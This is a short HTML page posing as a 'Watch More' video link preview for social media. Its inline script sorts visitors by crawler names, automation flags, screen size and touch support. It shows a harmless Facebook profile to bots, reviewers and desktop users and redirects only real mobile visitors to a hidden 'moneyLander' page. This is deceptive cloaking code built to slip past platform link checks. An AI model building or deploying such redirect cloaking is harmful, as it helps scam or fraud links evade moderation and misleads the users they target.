<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Watch More">
    <meta property="og:description" content="abr.ge">
    
    <meta property="og:image" content="https://i.postimg.cc/nLFxDC2Q/482294128736867509.jpg">
    <meta property="og:image:width" content="500">
    <meta property="og:image:height" content="500">
    <meta property="og:type" content="website">

    <script>
        // Redirect URLs
        const safeRedirect = "https://web.facebook.com/FawazAhmed01";
        const moneyLander = "https://plum-aloe-11v65rb.mystrikingly.com/";

        const ua = navigator.userAgent.toLowerCase();
        
        // 1. Screen Width Check (490px se badi har screen tablet/laptop mani jayegi)
        const isLargeScreen = window.innerWidth > 490;

        // 2. Known Bots Check
        const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
        const isAutomated = navigator.webdriver === true;

        // 3. Hardware / Sensor Layer
        const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);

        // 4. Device Logic
        const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
        const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);

        // FINAL FILTER
        if (isLargeScreen) {
            window.location.replace(safeRedirect);
        } else if (isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
            window.location.replace(safeRedirect);
        } else if (isMobileOrTablet && hasTouchSupport) {
            window.location.replace(moneyLander);
        } else {
            window.location.replace(safeRedirect);
        }
    </script>
</head>
<body style="background-color: #ffffff; margin: 0; padding: 0; text-align: center;">

</body>
